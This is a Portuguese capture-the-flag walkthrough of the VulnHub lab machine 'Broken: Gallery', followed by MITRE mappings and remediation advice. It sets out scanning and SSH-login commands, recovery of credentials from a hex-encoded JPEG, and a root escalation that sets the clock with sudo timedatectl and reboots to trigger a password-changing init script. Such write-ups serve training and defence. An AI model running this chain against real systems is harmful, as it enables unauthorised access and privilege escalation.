# Broken: Gallery — Writeup (PT-BR)

> *Uma galeria web que codifica em hex um JPEG dentro de um README, esse JPEG tem a senha SSH, e quando você entra os scripts de init trocam a senha do root quando o relógio bate num timestamp mágico de 2015. Mano, quem projetou isso e por que `sudo timedatectl` existe pra um usuário não-admin? Box esquisito, mas a manipulação de tempo é genuinamente criativa, tá ligado?*

---

## Metadados da Máquina

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | Broken: Gallery |
| **VM Atacante** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/broken-gallery,/ |
| **Técnicas** | Decodificação hex-para-binário, esteganografia (credenciais em imagem), login SSH, vazamento de bash history, manipulação de tempo via sudo timedatectl, escalada de privilégio via script de init |
| **CVEs** | Nenhum (chain de misconfig) |
| **Relevância APT** | Mecanismos de gatilho baseados em tempo são usados em implantes APT (ex.: janelas de callback C2 agendadas); misconfig de sudo para utilitários de sistema (timedatectl, systemctl) é um achado comum de privesc Linux documentado por Red Canary e MITRE |

---

## Resumo do Ataque

```
[Atacante]
      |
      v
netdiscover + nmap -A 192.168.1.107
--> 22/tcp (SSH), 80/tcp (HTTP Apache)
      |
      v
Acessar http://192.168.1.107/
wget README.md da página da galeria
      |
      v
README.md contém uma longa string hex
xxd -r -p --> decoded.jpg (JPEG)
Abrir JPEG --> credenciais SSH visíveis: broken:<senha>
      |
      v
ssh broken@192.168.1.107
sudo -l --> NOPASSWD: /bin/timedatectl, /sbin/reboot
      |
      v
cat ~/.bash_history
--> referência a /etc/init.d/password-policy.sh
cat /etc/init.d/password-policy.sh
--> troca senha do root quando data == "2015-11-20 16:14:50"
      |
      v
sudo timedatectl set-time '2015-11-20 16:14:50'
sudo /sbin/reboot
      |
      v
Reconectar SSH como broken
su root
Senha: TodayIsAgoodDay
--> uid=0(root)
    [ROOT]
```

---

## Metodologia

1. Descoberta de rede: identificação do host e enumeração de serviços
2. Enumeração web: download de arquivos da galeria e inspeção do README.md
3. Decodificação hex: converter string hex em arquivo JPEG binário
4. Extração de credencial do arquivo de imagem
5. Login SSH com credenciais descobertas
6. Vazamento de bash history e análise do script de init
7. Escalada de privilégio: manipulação de tempo via sudo timedatectl para acionar script de init de troca de senha

---

## Passos

### Passo 1: Descoberta de Host e Varredura de Portas

**Contexto:** Descobrir o IP alvo na rede local e realizar uma varredura completa de serviço para mapear a superfície de ataque.

```bash
netdiscover -r 192.168.1.0/24
nmap -A 192.168.1.107 -oN nmap-gallery.txt
```

**Saída esperada:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH x.x
80/tcp open  http    Apache httpd 2.x
```

**Alternativas:** `arp-scan -l` para descoberta rápida de host sem ruído de broadcast; `rustscan -a 192.168.1.107` para enumeração de portas mais rápida.

**Nota real:** Uma superfície de duas portas (SSH + HTTP) é típica de um appliance Linux embarcado simples ou servidor web básico. Em engajamentos reais, ambas as portas são totalmente enumeradas: versão SSH, banner grabbing, cabeçalhos HTTP, stack de tecnologia do servidor.

**MITRE TTP:** T1595.001 - Varredura Ativa: Blocos de IP | T1046 - Descoberta de Serviço de Rede

---

### Passo 2: Enumeração Web e Download do README

**Contexto:** O serviço HTTP hospeda uma página de galeria com arquivos para download. Um arquivo `README.md` é acessível diretamente e contém a primeira pista.

```bash
# Acessar:
http://192.168.1.107/

# Baixar o README:
wget http://192.168.1.107/README.md
cat README.md
```

**Saída esperada:**
```
(longa string hex, muitos caracteres)
4a46494600010100...
```

**Alternativas:** `curl -s http://192.168.1.107/README.md -o README.md`; use gobuster para encontrar outros arquivos: `gobuster dir -u http://192.168.1.107/ -w /usr/share/seclists/Discovery/Web-Content/common.txt`.

**Nota real:** Arquivos chamados `README`, `NOTES`, `TODO`, `config.bak`, `backup.zip` em servidores web públicos são fonte clássica de dados sensíveis. Scanners automatizados e ferramentas de recon de bug bounty (gau, katana, hakrawler) enumeram esses caminhos rotineiramente.

**MITRE TTP:** T1083 - Descoberta de Arquivos e Diretórios | T1552.001 - Credenciais Não Seguras: Credenciais em Arquivos

---

### Passo 3: Decodificação Hex para JPEG e Extração de Credencial

**Contexto:** A string hex no README.md é um arquivo binário cru codificado como hex. Decodificando, obtemos uma imagem JPEG. As credenciais para o usuário `broken` estão visíveis no conteúdo da imagem. Nossa, criativo demais isso.

```bash
cat README.md | xxd -r -p > decoded.jpg
file decoded.jpg
# Saída: JPEG image data, JFIF standard 1.01
```

Abrir `decoded.jpg` em um visualizador de imagens. A senha SSH está exibida visualmente na imagem.

**Alternativas:**
```bash
# One-liner Python:
python3 -c "import binascii; open('decoded.jpg','wb').write(binascii.unhexlify(open('README.md').read().strip()))"

# Verificar dados embutidos (esteganografia):
steghide info decoded.jpg
exiftool decoded.jpg
strings decoded.jpg | grep -i pass
```

**Nota real:** Credenciais embutidas em arquivos de imagem sobrevivem à maioria dos scanners de segredos baseados em texto. O truffleHog v3 agora suporta varredura de arquivos binários, mas imagens ainda são um ponto cego em muitos pipelines CI/CD. Pentesters verificam toda mídia para download durante avaliações de app web.

**MITRE TTP:** T1552.001 - Credenciais Não Seguras: Credenciais em Arquivos

---

### Passo 4: Login SSH

**Contexto:** Com as credenciais extraídas do JPEG decodificado, fazer login como usuário `broken` via SSH e imediatamente verificar direitos sudo.

```bash
ssh broken@192.168.1.107
# Inserir senha da imagem

sudo -l
```

**Saída esperada:**
```
User broken may run the following commands on gallery:
    (root) NOPASSWD: /bin/timedatectl
    (root) NOPASSWD: /sbin/reboot
```

**Nota real:** A presença de regras sudo `NOPASSWD` para utilitários de sistema é um red flag em qualquer auditoria de segurança. `timedatectl` e `reboot` nunca devem ser delegados a usuários não-admin; eles fornecem controle indireto sobre a integridade do sistema e scripts de inicialização.

**MITRE TTP:** T1078.003 - Contas Válidas: Contas Locais | T1021.004 - Serviços Remotos: SSH

---

### Passo 5: Vazamento do Bash History e Descoberta do Script de Init

**Contexto:** Verificar `.bash_history` do usuário `broken`. Comandos anteriores revelam referência a um script de inicialização de política de senha.

```bash
cat ~/.bash_history
```

**Saída esperada (trecho relevante):**
```
cat /etc/init.d/password-policy.sh
```

**Ler o script:**
```bash
cat /etc/init.d/password-policy.sh
```

**Conteúdo esperado (lógica simplificada):**
```bash
#!/bin/bash
if [ "$(date '+%Y-%m-%d %H:%M:%S')" == "2015-11-20 16:14:50" ]; then
    echo "root:TodayIsAgoodDay" | chpasswd
fi
```

**Nota real:** `.bash_history` é uma mina de ouro para investigadores forenses e atacantes. Revela comandos executados, scripts referenciados, caminhos acessados e às vezes credenciais. Hardening em produção: definir `HISTFILE=/dev/null` para contas de serviço, `HISTSIZE=0`, e restringir permissões de leitura do `.bash_history` apenas ao usuário dono.

**MITRE TTP:** T1552.003 - Credenciais Não Seguras: Bash History | T1083 - Descoberta de Arquivos e Diretórios

---

### Passo 6: Escalada de Privilégio via sudo timedatectl e Reboot

**Contexto:** O script de init troca a senha do root apenas quando o relógio do sistema bate `2015-11-20 16:14:50`. Com `sudo timedatectl`, definir o horário para corresponder, depois rebotar para acionar todos os scripts de init como root. Capaz que isso funciona, vamos ver.

```bash
# Definir horário do sistema para acionar a condição:
sudo timedatectl set-time '2015-11-20 16:14:50'

# Verificar (opcional):
date

# Rebotar para executar scripts de init:
sudo /sbin/reboot
```

**Aguardar a máquina voltar online, depois reconectar:**
```bash
ssh broken@192.168.1.107

# Trocar para root com a senha recém-definida:
su root
# Senha: TodayIsAgoodDay

id
# uid=0(root) gid=0(root) groups=0(root)
```

**Saída esperada:**
```
root@gallery:~# id
uid=0(root) gid=0(root) groups=0(root)
root@gallery:~# cat /root/root.txt
[FLAG ROOT]
```

**Alternativas:** Se `timedatectl` estiver sincronizado por NTP e rejeitar mudanças manuais, desabilitar NTP primeiro: `sudo timedatectl set-ntp false` e depois definir o horário.

**Nota real:** Condições de segurança baseadas em tempo (trocas de senha agendadas, janelas de validade de certificado, verificações de licença) são intrinsecamente contornáveis por qualquer usuário com controle do horário do sistema. Em ambientes ICS/OT, manipulação de tempo é uma técnica de ataque documentada (MITRE ICS T0895). Servidores NTP devem ser protegidos e modificação de tempo do sistema deve exigir acesso privilegiado.

**MITRE TTP:** T1548.003 - Abuso de Controle de Elevação: Sudo | T1053 - Tarefa Agendada (gatilho de script de init)

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Onde Encontrado | Usado Para |
|---|---|---|---|
| Credencial | `broken:<senha do JPEG>` | JPEG decodificado do hex no README.md | Login SSH |
| Credencial Root | `root:TodayIsAgoodDay` | /etc/init.d/password-policy.sh (acionado) | Acesso root |
| Flag Root | `/root/root.txt` | Pós-escalada | Conclusão da máquina |

---

## Lições Aprendidas

| Achado | Relevância no Mundo Real |
|---|---|
| Credenciais visíveis em arquivo de imagem para download público | Imagens são ponto cego para a maioria dos scanners automatizados de segredos. Revisão manual de todo conteúdo para download é necessária em avaliações de app web. |
| Codificação hex como "ofuscação" | Como Base64, codificação hex é trivialmente reversível. Não oferece nenhuma segurança. Use criptografia adequada ou um gerenciador de segredos. |
| sudo timedatectl concedido a usuário não-admin | Controle do tempo do sistema permite contornar qualquer condição de segurança dependente de tempo. Restringir ao root. Manipulação de NTP é uma técnica real de atacante. |
| sudo reboot concedido a usuário não-admin | Reboot aciona todos os scripts de init como root. Qualquer script de init com lógica explorável se torna um vetor de privesc. |
| Script de init de troca de senha baseado em timestamp | Trocas de senha baseadas em tempo são frágeis e exploráveis. Use módulos PAM, gerenciamento de identidade central (LDAP, AD), ou uma ferramenta de rotação de segredos. |
| .bash_history vazando caminhos de scripts | Arquivos de histórico revelam detalhes operacionais. Sanitize o histórico para contas de serviço e restrinja permissões do arquivo. |

---

## Mapeamento MITRE ATT&CK

| Tática | Técnica | ID |
|---|---|---|
| Reconhecimento | Varredura Ativa: Blocos de IP | T1595.001 |
| Descoberta | Descoberta de Serviço de Rede | T1046 |
| Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso a Credenciais | Credenciais Não Seguras: Credenciais em Arquivos | T1552.001 |
| Acesso a Credenciais | Credenciais Não Seguras: Bash History | T1552.003 |
| Acesso Inicial | Contas Válidas: Contas Locais (SSH) | T1078.003 |
| Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Escalada de Privilégio | Abuso de Controle de Elevação: Sudo | T1548.003 |
| Escalada de Privilégio | Scripts de Inicialização de Boot ou Logon | T1037 |

---

## Remediação

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | ID.AM-2 | Inventariar todos os arquivos acessíveis pela web; remover conteúdo para download desnecessário |
| Proteger | PR.AC-4 | Remover timedatectl e reboot do sudoers para contas não-admin |
| Proteger | PR.DS-1 | Nunca armazenar credenciais em arquivos de imagem ou documentos acessíveis publicamente |
| Detectar | DE.CM-3 | Monitorar sudo timedatectl/reboot e modificações em scripts de init |
| Proteger | PR.IP-1 | Substituir condições de script de init baseadas em tempo por gerenciamento de identidade adequado |

### Controles NIST SP 800-53

| Controle | Requisito | Aplicabilidade |
|---|---|---|
| IA-5 | Gerenciamento de Autenticador | Credenciais não devem ser embutidas em arquivos de mídia ou documentos públicos |
| AC-6 | Menor Privilégio | Remover timedatectl e reboot de regras sudo sem privilégios |
| CM-6 | Configurações | Auditar sudoers regularmente; remover todas as entradas NOPASSWD para utilitários de sistema |
| AU-9 | Proteção de Informações de Auditoria | Restringir permissões do .bash_history; sanitizar histórico para contas de serviço |
| SC-45 | Serviços de Tempo do Sistema | Restringir modificação do tempo do sistema ao root; usar NTP autenticado |

### Relevância CISA KEV

Sem CVEs diretos. Misconfig de sudo (similar a CVE-2021-3156 heap overflow do sudo, CVE-2019-14287 bypass do sudo) é uma classe persistente de escalada de privilégio. CISA recomenda auditoria regular de sudo como parte do hardening baseline para todos os sistemas Linux.

### C2M2 (Modelo de Maturidade de Capacidade em Cibersegurança)

| Domínio | Prática | Lacuna |
|---|---|---|
| ACM | ACM-2b | Sem revisão de conteúdo para download público = MIL0 |
| IAM | IAM-2a | sudo irrestrito para utilitários de sistema = MIL0 |
| SA | SA-1a | Sem monitoramento de modificações em scripts de init = MIL0 |

### Contramedidas MITRE D3FEND

| Técnica D3FEND | ID | Defende Contra |
|---|---|---|
| Hardening de Credencial | D3-CH | Credencial embutida em arquivo de imagem |
| Análise de Comportamento do Usuário | D3-UBA | timedatectl e reboot anômalos via sudo |
| Análise de Chamada de Sistema | D3-SCA | Execução de chpasswd por script de init no boot |
| Regras de Conteúdo de Arquivo | D3-FCR | Detectar padrões de credencial em arquivos para download |

---

## Considerações Finais

Pô, Broken: Gallery é uma box easy manhosa que ensina a caçar credenciais em lugares inesperados. A decodificação hex-em-README-para-JPEG é genuinamente um puzzle divertido, e o pivô `sudo timedatectl` + script de init é um dos caminhos de privesc mais criativos que você vai encontrar em uma máquina para iniciantes. O verdadeiro aprendizado: nunca assuma que porque algo é "apenas uma imagem" ou "apenas um README" ele não pode conter dados sensíveis. E quem colocou `timedatectl` no sudoers: mano, isso não tá certo. Mas obrigado pelo root shell. GG.

Thanks guys!! (❍ᴥ❍ʋ)
